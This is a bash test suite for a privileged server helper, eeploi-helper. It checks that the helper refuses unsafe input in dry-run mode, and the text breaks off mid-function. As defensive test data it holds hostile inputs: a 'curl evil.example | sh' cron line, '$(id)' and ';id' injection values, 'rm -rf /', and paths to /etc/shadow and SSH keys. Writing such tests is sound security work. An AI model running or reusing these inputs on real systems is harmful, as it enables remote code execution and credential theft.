#!/usr/bin/env bash
# Tests for eeploi-helper: bash -n, shellcheck (when installed) and many dry-run cases.
# No extra dependencies. Never run as root: nothing here needs it.
set -uo pipefail

ROOT=$(cd "$(dirname "$0")/.." && pwd)
HELPER="$ROOT/eeploi-helper"

if [ "$(id -u)" -eq 0 ]; then
  echo "Do not run the tests as root." >&2
  exit 1
fi

PASS=0
FAILED=0
FAILURES=""

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

pass() { PASS=$((PASS + 1)); }
failure() {
  FAILED=$((FAILED + 1))
  FAILURES="$FAILURES
  - $1"
  printf 'FAIL %s\n%s\n\n' "$1" "$2"
}

# Fixtures: /etc/eeploi variants and nginx.conf variants.
mkdir -p "$WORK/etc-empty" "$WORK/etc-new" "$WORK/etc-conf" "$WORK/etc-badline" "$WORK/etc-root" \
  "$WORK/etc-twice" "$WORK/etc-writable" "$WORK/etc-link" "$WORK/etc-inject" "$WORK/etc-newwritable"
chmod 755 "$WORK"/etc-*
touch "$WORK/etc-new/new-server"
touch "$WORK/etc-newwritable/new-server"
chmod 666 "$WORK/etc-newwritable/new-server"
printf '# eeploi\nDEPLOY_USER=deploy\n' > "$WORK/etc-conf/helper.conf"
printf 'DEPLOY_USER=deploy\nPATH=/tmp\n' > "$WORK/etc-badline/helper.conf"
printf 'DEPLOY_USER=root\n' > "$WORK/etc-root/helper.conf"
printf 'DEPLOY_USER=deploy\nDEPLOY_USER=other\n' > "$WORK/etc-twice/helper.conf"
printf 'DEPLOY_USER=deploy\n' > "$WORK/etc-writable/helper.conf"
chmod 666 "$WORK/etc-writable/helper.conf"
ln -s "$WORK/etc-conf/helper.conf" "$WORK/etc-link/helper.conf"
# shellcheck disable=SC2016
printf 'DEPLOY_USER=$(id)\n' > "$WORK/etc-inject/helper.conf"

printf 'user www-data;\nworker_processes auto;\nevents {}\n' > "$WORK/nginx-default.conf"
printf 'user ploi;\nworker_processes auto;\n' > "$WORK/nginx-ploi.conf"
printf 'user  nginx  web ; # comment\n' > "$WORK/nginx-group.conf"
printf 'worker_processes auto;\n# user nobody;\nhttp { userid on; }\n' > "$WORK/nginx-none.conf"
printf 'user www-data;\nuser ploi;\n' > "$WORK/nginx-two.conf"
printf 'user root;\n' > "$WORK/nginx-root.conf"
printf 'user www-data; include /tmp/x;\n' > "$WORK/nginx-junk.conf"
# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
printf 'user $(id);\n' > "$WORK/nginx-inject.conf"
printf 'user\twww-data;\n' > "$WORK/nginx-tab.conf"

# Site users: registries in <etc>/sites, one file per user. etc-sites is the default /etc/eeploi.
add_sites() {
  mkdir -p "$1/sites"
  chmod 755 "$1" "$1/sites"
  printf 'DOMAIN=shop.example\nHOME=/srv/eeploi/shop_example\nCRON=/etc/cron.d/eeploi-shop_example\nREDIS_CONF=/etc/eeploi/redis/shop_example.conf\n' > "$1/sites/shop_example"
  printf '# a comment\nDOMAIN=www.shop.example\n\n' > "$1/sites/shop"
  local user
  for user in shop_other shop_sudo shop_low shop_away shop_group shop_half; do
    printf 'DOMAIN=%s.example\n' "${user#shop_}" > "$1/sites/$user"
  done
}
add_sites "$WORK/etc-sites"
add_sites "$WORK/etc-conf"
add_sites "$WORK/etc-plain"
printf 'DOMAIN=shop.example\n' > "$WORK/etc-plain/sites/shop_example"
# The longest name: 32 characters, for db-create's socket login.
LONG_USER=b2345678901234567890123456789012
printf 'DOMAIN=long.example\n' > "$WORK/etc-sites/sites/$LONG_USER"
# Broken registries, each in a folder of its own: the helper refuses them all.
for bad in writable link badline inject twice nodomain baddomain folder; do
  add_sites "$WORK/etc-reg-$bad"
done
chmod 666 "$WORK/etc-reg-writable/sites/shop_example"
rm "$WORK/etc-reg-link/sites/shop_example"
ln -s "$WORK/etc-sites/sites/shop_example" "$WORK/etc-reg-link/sites/shop_example"
printf 'DOMAIN=shop.example\nPATH=/tmp\n' > "$WORK/etc-reg-badline/sites/shop_example"
# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
printf 'DOMAIN=$(id)\n' > "$WORK/etc-reg-inject/sites/shop_example"
printf 'DOMAIN=shop.example\nDOMAIN=other.example\n' > "$WORK/etc-reg-twice/sites/shop_example"
printf 'HOME=/srv/eeploi/shop_example\n' > "$WORK/etc-reg-nodomain/sites/shop_example"
printf 'DOMAIN=shop\n' > "$WORK/etc-reg-baddomain/sites/shop_example"
chmod 777 "$WORK/etc-reg-folder/sites"

# What the server has (EEPLOI_HELPER_SYSTEM): users, groups, their groups (id -G), paths and running units.
# account <user> <uid> <home> <id -G>: a user with a group of its own, same name and id, and its home.
account() {
  printf 'passwd %s:x:%s:%s::%s:/usr/sbin/nologin\ngroup %s:x:%s:\nid %s:%s\npath %s\n' "$1" "$2" "$2" "$3" "$1" "$2" "$1" "$4" "$3"
}
{
  account shop_example 1001 /srv/eeploi/shop_example 1001
  account shop 1002 /srv/eeploi/shop 1002
  account shop_other 1003 /srv/eeploi/shop_other 1003
  account shop_sudo 1004 /srv/eeploi/shop_sudo '1004 27'
  account shop_low 999 /srv/eeploi/shop_low 999
  account shop_away 1005 /home/shop_away 1005
  echo 'passwd shop_group:x:1006:1010::/srv/eeploi/shop_group:/usr/sbin/nologin'
  echo 'group shop_group:x:1006:'
  echo 'id shop_group:1010'
  account "$LONG_USER" 1007 "/srv/eeploi/$LONG_USER" 1007
  account alex 1000 /home/alex 1000
  echo 'group shop_staff:x:1011:'
  echo 'path /srv/eeploi/shop_left'
  echo 'path /srv/eeploi'
  echo 'path /usr/bin/redis-server'
} > "$WORK/system"
grep -v redis-server "$WORK/system" > "$WORK/system-no-redis"
{ cat "$WORK/system"; echo 'active eeploi-redis@shop_example.service'; } > "$WORK/system-redis-on"

# A copy with a well-formed (fake) release key, to test self-update past the key check.
FAKE_KEY='RWQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
sed "s#^PUBKEY=.*#PUBKEY='$FAKE_KEY'#" "$HELPER" > "$WORK/keyed-helper"

# call <args...>: run the helper in dry-run mode. Settings (temporary per call):
#   IN (stdin), AS (SUDO_USER, default eeploi), ETC_DIR (default etc-sites), NGINX (nginx.conf), BIN (helper file),
#   DRYRUN (1 or empty), DBSTATE (what db-create's checks find), SYS (what the server has, default system)
call() {
  local dry=${DRYRUN-1}
  OUT=$(printf '%s' "${IN:-}" | env -i PATH="$PATH" \
    EEPLOI_HELPER_DRY_RUN="$dry" SUDO_USER="${AS-eeploi}" \
    EEPLOI_HELPER_ETC="${ETC_DIR:-$WORK/etc-sites}" \
    EEPLOI_HELPER_NGINX_CONF="${NGINX:-$WORK/nginx-default.conf}" \
    EEPLOI_HELPER_DB_STATE="${DBSTATE:-}" \
    EEPLOI_HELPER_SYSTEM="${SYS-$WORK/system}" \
    bash "${BIN:-$HELPER}" "$@" 2>&1)
  CODE=$?
}

# ok <name> <expected output> <args...>: exit 0 and the output contains the text.
ok() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and: $expected
$OUT"; fi
}

# lacks <name> <text> <args...>: exit 0 and the output does not contain the text.
lacks() {
  local name=$1 text=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT != *"$text"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and no: $text
$OUT"; fi
}

# refuse <name> <expected output> <args...>: exit 64 with an eeploi-helper message containing the text.
refuse() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"eeploi-helper:"* ]] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 64 and: $expected
$OUT"; fi
}

check() {
  local name=$1
  shift
  if OUT=$("$@" 2>&1); then pass; else failure "$name" "$OUT"; fi
}

echo "== syntax"
check "bash -n eeploi-helper" bash -n "$HELPER"
check "bash -n tests/run.sh" bash -n "$ROOT/tests/run.sh"
if command -v shellcheck > /dev/null; then
  check "shellcheck" shellcheck "$HELPER" "$ROOT/tests/run.sh"
else
  echo "note: shellcheck is not installed, skipped (CI runs it)"
fi

echo "== existing subcommands"
ok "version" "1.0.2" version
ok "nginx-test" "run: nginx -t" nginx-test
ok "nginx-reload" "run: service nginx reload" nginx-reload
ok "php-fpm" "run: service php8.4-fpm reload" php-fpm-reload 8.4
ok "vhost" "write: /etc/nginx/sites-available/shop.example (644)" vhost-write shop.example shop_example 8.4
ok "vhost-backup" "run: cp /etc/nginx/sites-available/example.com /var/lib/eeploi/nginx/example.com/vhost" vhost-backup example.com
ok "vhost-restore" "run: cp /var/lib/eeploi/nginx/example.com/vhost /etc/nginx/sites-available/example.com" vhost-restore example.com
ok "vhost-enable" "run: ln -sfn /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/example.com" vhost-enable example.com
ok "vhost-disable" "run: rm -f /etc/nginx/sites-enabled/example.com" vhost-disable example.com
ok "vhost-remove" "run: rm -f /etc/nginx/sites-enabled/example.com /etc/nginx/sites-available/example.com" vhost-remove example.com
ok "root" "root /home/eeploi/example.com/current/public;" vhost-set-root example.com /home/ploi/example.com/public /home/eeploi/example.com/current/public
ok "vhost-set-cert" "ssl_certificate /etc/nginx/ssl/eeploi-example.com.crt;" vhost-set-cert example.com
ok "ssl-csr" "run: openssl req -new -key /etc/nginx/ssl/eeploi-example.com.key -subj /CN=example.com" ssl-csr eeploi-example.com
IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----\n' ok "certificate" "write: /etc/nginx/ssl/eeploi-example.com.crt (644)" ssl-write eeploi-example.com
ok "ssl-remove" "run: rm -f /etc/nginx/ssl/example.com.crt /etc/nginx/ssl/example.com.key" ssl-remove example.com
IN='php artisan horizon' ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-shop.example-horizon.conf (644)" \
  supervisor-write eeploi-shop.example-horizon shop_example /srv/eeploi/shop_example/shop.example/current 2
ok "supervisor-remove" "run: rm -f /etc/supervisor/conf.d/eeploi-example.com-a.conf" supervisor-remove eeploi-example.com-a
ok "supervisor-remove-site" "" supervisor-remove-site example.com
ok "pause" "run: mv /etc/supervisor/conf.d/worker-233475.conf /etc/supervisor/conf.d/worker-233475.conf.paused" supervisor-pause /etc/supervisor/conf.d/worker-233475.conf
ok "resume" "run: mv /etc/supervisor/conf.d/worker-233475.conf.paused /etc/supervisor/conf.d/worker-233475.conf" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
ok "supervisor-update" "run: supervisorctl update" supervisor-update
CRON_LINE=$'* * * * * shop_example php8.4 /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n'
IN=$CRON_LINE ok "cron" "write: /etc/cron.d/eeploi-shop_example (644)" cron-write shop_example
ok "cron-remove" "run: rm -f /etc/cron.d/eeploi-shop_example" cron-remove shop_example
ok "crontab-restore" "add back to /etc/crontab: the lines in /var/lib/eeploi/crontab/example.com" crontab-restore example.com
IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines" "remove from /etc/crontab: 0 3 * * * ploi php /home/ploi/a/artisan x" crontab-remove-lines example.com
IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines saves" "save: /var/lib/eeploi/crontab/example.com" crontab-remove-lines example.com
SITE=/srv/eeploi/shop_example/shop.example
ok "env" "runuser -u shop_example -- sh -c" env-install /home/ploi/example.com/.env $SITE/.env shop_example
ok "storage-copy" "run: tar -C /home/ploi/a/storage -cf - . | runuser -u shop_example -- tar -C $SITE/storage -xf - --no-same-owner" storage-copy /home/ploi/a/storage $SITE/storage shop_example

echo "== refusals"
AS='' refuse "not through sudo" "run through sudo" version
AS=root refuse "root as caller" "run through sudo" version
AS=www-data refuse "other user as caller" "run through sudo" version
refuse "no subcommand" "usage"
refuse "unknown subcommand" "unknown subcommand" rm -rf /
refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id' shop_example 8.4
refuse "domain without a dot" "invalid domain" vhost-enable localhost
refuse "domain with a slash" "invalid domain" vhost-backup ../../etc/passwd
refuse "uppercase domain" "invalid domain" vhost-enable Example.com
refuse "php version" "invalid PHP version" php-fpm-reload '8.4;id'
refuse "php version without dot" "invalid PHP version" php-fpm-reload 84
refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow $SITE/.env shop_example
refuse "path outside home" "outside the allowed home folders" storage-copy /etc $SITE/storage shop_example
refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x $SITE/storage shop_example
AS=ploi refuse "copy from own home" "source cannot be in /home/ploi" env-install /home/ploi/a/.env /home/ploi/b/.env ploi
refuse "copy into ploi's home" "not in /srv/eeploi/shop_example" env-install /home/ploi/a/.env /home/ploi/b/.env shop_example
refuse "other owner" "reserved name, not a site user: root" env-install /home/ploi/a/.env $SITE/.env root
refuse "root as new root" "outside the allowed home folders" vhost-set-root example.com /home/ploi/x/public /etc
refuse "vhost-set-root arguments" "usage" vhost-set-root example.com /home/ploi/x/public
refuse "program name" "invalid program" supervisor-remove nginx
IN='id' refuse "daemon directory outside home" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /etc 1
IN='id' refuse "daemon directory in another home" "not in $SITE" supervisor-write eeploi-shop.example-a shop_example /home/ploi/a 1
IN='id' refuse "daemon processes" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 33
IN='id' refuse "daemon processes zero" "processes must be 1 to 32" supervisor-write eeploi-shop.example-a shop_example $SITE/current 0
IN='' refuse "daemon empty command" "empty command" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
refuse "pause any file" "invalid Supervisor config" supervisor-pause /etc/passwd
IN=$'* * * * * root php /srv/eeploi/shop_example/shop.example/current/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write shop_example
IN=$'* * * * * shop_example curl evil.example | sh\n' refuse "cron any command" "only" cron-write shop_example
IN=$'* * * * * shop_example php /etc/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron outside home" "only" cron-write shop_example
refuse "certificate name" "invalid domain" ssl-csr ../../etc/passwd
refuse "crontab-remove-lines arguments" "usage" crontab-remove-lines example.com /etc/passwd

echo "== root escapes (server-access audit, 2026-11-09)"
# vhost-write: the vhost is built by the helper; caller content can't reach nginx (root opens log files).
IN=$'access_log /etc/cron.d/x;\n' refuse "vhost from stdin" "usage" vhost-write example.com
# etc-plain: a registry without a CRON line, so /etc/cron.d can only come from stdin.
IN=$'access_log /etc/cron.d/x;\n' ETC_DIR="$WORK/etc-plain" lacks "vhost ignores stdin" "/etc/cron.d" vhost-write shop.example shop_example 8.4
ok "vhost logs in /var/log/nginx" "access_log /var/log/nginx/eeploi-shop.example-access.log;" vhost-write shop.example shop_example 8.4
ok "vhost root in the site user's home" "root /srv/eeploi/shop_example/shop.example/current/public;" vhost-write shop.example shop_example 8.4
refuse "vhost socket from the PHP version" "invalid PHP version" vhost-write shop.example shop_example '8.4-fpm.sock;/tmp/evil'
# ssl-include-write: gone; take-over backups are made and restored by root (vhost-backup, vhost-restore).
IN=$'access_log /etc/cron.d/x;\n' refuse "ssl include from stdin" "unknown subcommand" ssl-include-write example.com
refuse "vhost-read gone" "unknown subcommand" vhost-read example.com
refuse "ssl-read gone" "unknown subcommand" ssl-read example.com.key
# supervisor-write: built from arguments; one command line, log in /var/log/supervisor.
IN=$'[program:eeploi-example.com-a]\ncommand=id\nuser=eeploi\nstdout_logfile=/etc/cron.d/x\n' refuse "supervisor config from stdin" "usage" supervisor-write eeploi-example.com-a
IN=$'id\nstdout_logfile=/etc/cron.d/x' refuse "supervisor extra line" "one line" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
IN='php artisan horizon' ok "supervisor log in /var/log/supervisor" "stdout_logfile=/var/log/supervisor/eeploi/shop_example/eeploi-shop.example-a.log" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
IN='php artisan horizon' ok "supervisor as the site user" "user=shop_example" supervisor-write eeploi-shop.example-a shop_example $SITE/current 1
# storage-copy and env-install: root only reads from /home/ploi or /home/forge; the site user writes.
refuse "storage from own home" "source must be in /home/ploi or /home/forge" storage-copy /home/eeploi/a/storage $SITE/storage shop_example
refuse "env from own home" "source must be in /home/ploi or /home/forge" env-install /home/eeploi/a/.env $SITE/.env shop_example
refuse "env from a site home" "source must be in /home/ploi or /home/forge" env-install /srv/eeploi/shop/www.shop.example/.env $SITE/.env shop_example
lacks "env not written by root" "install -o" env-install /home/ploi/a/.env $SITE/.env shop_example
lacks "storage not written by root" "rsync" storage-copy /home/ploi/a/storage $SITE/storage shop_example
# self-update: only a newer version than the installed one.
BIN="$WORK/keyed-helper" refuse "downgrade" "only a newer version" self-update 0.9.9
# crontab: only ploi or forge jobs in their home; restore adds back only those lines.
IN=$'17 * * * * root cd / && run-parts --report /etc/cron.hourly\n' refuse "system cron line" "only ploi or forge jobs" crontab-remove-lines example.com
IN=$'* * * * * ploi php /etc/x/artisan schedule:run\n' refuse "ploi job outside home" "only ploi or forge jobs" crontab-remove-lines example.com
IN='' refuse "no cron lines" "no lines given" crontab-remove-lines example.com
refuse "crontab-backup gone" "unknown subcommand" crontab-backup example.com
# ssl-write: only a PEM certificate.
IN=$'access_log /etc/cron.d/x;\n' refuse "ssl-write not a certificate" "not one PEM certificate" ssl-write example.com

echo "== second helper audit (2026-11-10)"
# env-install and storage-copy: only a .env file and a storage folder.
refuse "env source not a .env" "source must end in /.env" env-install /home/ploi/.ssh/id_ed25519 $SITE/.env shop_example
refuse "env source .env in the middle" "source must end in /.env" env-install /home/ploi/a/.env/x $SITE/.env shop_example
refuse "env source like .env" "source must end in /.env" env-install /home/forge/a/.env.backup $SITE/.env shop_example
refuse "env source a storage folder" "source must end in /.env" env-install /home/ploi/a/storage $SITE/.env shop_example
refuse "storage source not storage" "source must end in /storage" storage-copy /home/ploi/.ssh $SITE/storage shop_example
refuse "storage source the home" "source must end in /storage" storage-copy /home/forge/a $SITE/storage shop_example
refuse "storage source in storage" "source must end in /storage" storage-copy /home/ploi/a/storage/app $SITE/storage shop_example
refuse "storage source like storage" "source must end in /storage" storage-copy /home/ploi/a/old-storage $SITE/storage shop_example
ok "env from forge" "run: dd if=/home/forge/example.com/.env iflag=nofollow" env-install /home/forge/example.com/.env $SITE/.env shop_example
ok "storage from a deploy folder" "run: tar -C /home/ploi/a-deploy/storage -cf -" storage-copy /home/ploi/a-deploy/storage $SITE/storage shop_example
# self-update: strictly newer, compared by number.
BIN="$WORK/keyed-helper" refuse "same version" "only a newer version" self-update 1.0.2
BIN="$WORK/keyed-helper" refuse "older version" "only a newer version" self-update 0.99.99
BIN="$WORK/keyed-helper" ok "newer patch" "download:" self-update 1.0.3
BIN="$WORK/keyed-helper" ok "newer minor" "download:" self-update 1.1.0
BIN="$WORK/keyed-helper" ok "newer major" "download:" self-update 2.0.0
BIN="$WORK/keyed-helper" ok "numbers, not text" "download:" self-update 1.0.10
sed "s#^VERSION=.*#VERSION='1.2.10'#" "$WORK/keyed-helper" > "$WORK/v1210-helper"
BIN="$WORK/v1210-helper" refuse "numbers, not text (older)" "only a newer version" self-update 1.2.9
BIN="$WORK/v1210-helper" ok "numbers, not text (newer)" "download:" self-update 1.2.11
BIN="$WORK/v1210-helper" refuse "numbers, not text (minor)" "only a newer version" self-update 1.1.99
# ssl-csr: the key is made under umask 077.
ok "ssl-csr key private from the start" "run: sh -c umask 077 && exec openssl genpkey" ssl-csr eeploi-example.com
ok "ssl-csr key mode" "run: chmod 600 /etc/nginx/ssl/eeploi-example.com.key" ssl-csr eeploi-example.com
# HOME and locale pinned; curl reads no curlrc.
check "HOME and LC_ALL pinned" grep -qx 'export TMPDIR=/tmp HOME=/root LC_ALL=C' "$HELPER"
BIN="$WORK/keyed-helper" ok "curl without curlrc" "run: curl -q --fail" self-update 1.2.3

echo "== deploy user from helper.conf"
lacks "default homes have no deploy" "deploy" version
AS=deploy refuse "deploy without config" "run through sudo" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.0.2" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy copies into a site home" "runuser -u shop_example -- sh -c" env-install /home/ploi/a/.env $SITE/.env shop_example
AS=deploy ETC_DIR="$WORK/etc-conf" refuse "the deploy user is not a site user" "reserved name, not a site user: deploy" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
ETC_DIR="$WORK/etc-conf" ok "eeploi still allowed with config" "1.0.2" version
ETC_DIR="$WORK/etc-badline" refuse "config with another line" "invalid line" version
ETC_DIR="$WORK/etc-root" refuse "config with root" "cannot be root" version
ETC_DIR="$WORK/etc-twice" refuse "config set twice" "set twice" version
ETC_DIR="$WORK/etc-writable" refuse "config writable by others" "untrusted config" version
ETC_DIR="$WORK/etc-link" refuse "config as a link" "untrusted config" version
ETC_DIR="$WORK/etc-inject" refuse "config with a command" "invalid line" version
if [ ! -e /etc/eeploi/helper.conf ]; then
  DRYRUN='' AS=deploy ETC_DIR="$WORK/etc-conf" refuse "EEPLOI_HELPER_ETC ignored without dry run" "run through sudo" version
else
  echo "note: /etc/eeploi/helper.conf exists here, skipped the override test"
fi

echo "== firewall-close-22"
ETC_DIR="$WORK/etc-new" ok "with marker" "run: ufw delete allow 22/tcp" firewall-close-22
refuse "without marker" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-newwritable" refuse "marker writable by others" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-new" refuse "with arguments" "usage" firewall-close-22 now
if [ ! -e /etc/eeploi/new-server ]; then
  DRYRUN='' ETC_DIR="$WORK/etc-new" refuse "EEPLOI_HELPER_ETC ignored without dry run" "only runs on a server eeploi created" firewall-close-22
else
  echo "note: /etc/eeploi/new-server exists here, skipped the override test"
fi

echo "== nginx user (site-user-create)"
# A new site user: no registry, no user, group or home of that name.
NEW=(site-user-create shop_new new.example)
ok "www-data" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-ploi.conf" ok "ploi" "run: setfacl -m u:ploi:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-none.conf" ok "no user line" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-tab.conf" ok "user line with a tab" "run: setfacl -m u:www-data:x /srv/eeploi/shop_new" "${NEW[@]}"
NGINX="$WORK/nginx-group.conf" ok "user and group" "check: user nginx and group web exist" "${NEW[@]}"
ok "checks the user exists" "check: user www-data and group www-data exist" "${NEW[@]}"
ok "installs acl when missing" "check: setfacl installed, else apt-get install acl" "${NEW[@]}"
NGINX="$WORK/nginx-two.conf" refuse "two user lines" "more than one user line" "${NEW[@]}"
NGINX="$WORK/nginx-root.conf" refuse "nginx as root" "nginx runs as root" "${NEW[@]}"
NGINX="$WORK/nginx-junk.conf" refuse "user line with more" "cannot read the user line" "${NEW[@]}"
NGINX="$WORK/nginx-inject.conf" refuse "user line with a command" "cannot read the user line" "${NEW[@]}"
NGINX="$WORK/missing.conf" refuse "no nginx.conf" "nginx config not found" "${NEW[@]}"
NGINX="$WORK/nginx-group.conf" refuse "the nginx user is reserved" "reserved name, not a site user: nginx" site-user-create nginx new.example
refuse "acl-nginx is gone" "unknown subcommand" acl-nginx

echo "== php-pool-write"
POOL=(php-pool-write 8.4 shop_example)
ok "pool file" "write: /etc/php/8.4/fpm/pool.d/eeploi-shop_example.conf (644)" "${POOL[@]}"
ok "pool name" "[shop_example]" "${POOL[@]}"
ok "pool user" "user = shop_example" "${POOL[@]}"
ok "pool group" "group = shop_example" "${POOL[@]}"
ok "pool socket" "listen = /run/php/php8.4-fpm-shop_example.sock" "${POOL[@]}"
ok "socket owner" "listen.owner = www-data" "${POOL[@]}"
ok "socket group" "listen.group = www-data" "${POOL[@]}"
ok "socket mode" "listen.mode = 0660" "${POOL[@]}"
ok "ondemand" "pm = ondemand
  pm.max_children = 5
  pm.process_idle_timeout = 10s
  pm.max_requests = 500
  request_terminate_timeout = 60" "${POOL[@]}"
ok "opcache ini" "write: /etc/php/8.4/fpm/conf.d/90-eeploi.ini (644)
  ; Written by eeploi-helper (php-pool-write). eeploi rewrites this file, do not edit.
  opcache.validate_permission = 1" "${POOL[@]}"
ok "test before reload" "run: php-fpm8.4 -t" "${POOL[@]}"
ok "reload last" "run: service php8.4-fpm reload" "${POOL[@]}"
ok "pool in the registry" "  POOL=/etc/php/8.4/fpm/pool.d/eeploi-shop_example.conf
write: $WORK/etc-sites/sites/shop_example (644)" "${POOL[@]}"
lacks "no [eeploi] pool" "[eeploi]" "${POOL[@]}"
lacks "no shared pool file" "pool.d/eeploi.conf" "${POOL[@]}"
NGINX="$WORK/nginx-ploi.conf" ok "socket for ploi" "listen.owner = ploi" php-pool-write 8.3 shop_example
AS=deploy ETC_DIR="$WORK/etc-conf" lacks "pool never as the deploy user" "user = deploy" "${POOL[@]}"
refuse "pool version" "invalid PHP version" php-pool-write '8.4/../../x' shop_example
refuse "pool version missing" "usage" php-pool-write
refuse "pool without a user" "usage" php-pool-write 8.4
refuse "pool two versions" "usage" php-pool-write 8.3 8.4 shop_example
refuse "pool for an unlisted user" "alex is not an eeploi site user" php-pool-write 8.4 alex
refuse "pool for the deploy user" "reserved name, not a site user: eeploi" php-pool-write 8.4 eeploi
NGINX="$WORK/nginx-root.conf" refuse "pool with nginx as root" "nginx runs as root" "${POOL[@]}"

echo "== vhost-set-socket"
SOCK=/run/php/php8.4-fpm-shop_example.sock
ok "to the site's socket" "fastcgi_pass unix:$SOCK;" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock $SOCK
ok "only the exact line" 'fastcgi_pass unix:/var/run/php/php8\.4-fpm\.sock;' vhost-set-socket example.com /var/run/php/php8.4-fpm.sock $SOCK
ok "nginx -t then reload" "run: nginx -t
run: service nginx reload" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock $SOCK
ok "rollback" "fastcgi_pass unix:/var/run/php/php8.4-fpm.sock;" vhost-set-socket example.com $SOCK /var/run/php/php8.4-fpm.sock
ok "run/php default" "unix:/run/php/php8.3-fpm-shop_example.sock;" vhost-set-socket example.com /run/php/php8.3-fpm.sock /run/php/php8.3-fpm-shop_example.sock
refuse "socket elsewhere" "invalid PHP-FPM socket" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /tmp/evil.sock
refuse "socket with .." "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/../php8.4-fpm.sock $SOCK
refuse "socket with a semicolon" "invalid PHP-FPM socket" vhost-set-socket example.com '/run/php/php8.4-fpm.sock;' $SOCK
refuse "socket other pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-root.sock
refuse "socket of the old eeploi pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
refuse "socket of an unlisted user" "invalid PHP-FPM socket: /run/php/php8.4-fpm-alex.sock (alex is not an eeploi site user)" \
  vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-alex.sock
refuse "socket of a listed user in sudo" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-shop_sudo.sock
refuse "same socket" "same socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm.sock
refuse "socket domain" "invalid domain" vhost-set-socket 'example.com;id' /run/php/php8.4-fpm.sock $SOCK
refuse "socket arguments" "usage" vhost-set-socket example.com /run/php/php8.4-fpm.sock

echo "== self-update"
sed "s#^PUBKEY=.*#PUBKEY='RWS...REPLACE_WITH_RELEASE_KEY'#" "$HELPER" > "$WORK/placeholder-helper"
BIN="$WORK/placeholder-helper" refuse "placeholder key" "PUBKEY is the placeholder" self-update 1.2.3
ok "verify with the release key" "run: minisign -V -q -P $(sed -n "s/^PUBKEY='\\(.*\\)'$/\\1/p" "$HELPER")" self-update 1.2.3
refuse "bad version" "invalid version" self-update 1.2
refuse "version with v" "invalid version" self-update v1.2.3
refuse "version with leading zero" "invalid version" self-update 01.2.3
refuse "version with suffix" "invalid version" self-update 1.2.3-beta
refuse "version with a path" "invalid version" self-update '1.2.3/../../x'
refuse "version with a newline" "invalid version" self-update $'1.2.3\nid'
refuse "no version" "usage" self-update
BIN="$WORK/keyed-helper" ok "download url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "signature url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper.minisig" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "verify with the built-in key" "run: minisign -V -q -P $FAKE_KEY" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "version check" "check: <download>/eeploi-helper version = 1.2.3" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "install" "install: /usr/local/sbin/eeploi-helper (root:root 755)" self-update 1.2.3
BIN="$WORK/keyed-helper" refuse "bad version with a key" "invalid version" self-update 1.2.3.4
sed "s#^PUBKEY=.*#PUBKEY='RWQshort'#" "$HELPER" > "$WORK/badkey-helper"
BIN="$WORK/badkey-helper" refuse "malformed key" "invalid release key" self-update 1.2.3

echo "== db-create"
PW='test-password-1234567890'
# What the checks find on the database server, one file per case (key=count, as the helper reads it):
# mariadb db_exists user_exists user_global user_elsewhere db_others granted [user_socket=0] [socket_plugin=1]
# [tcp_user_exists=0] [tcp_granted=0].
db_state() {
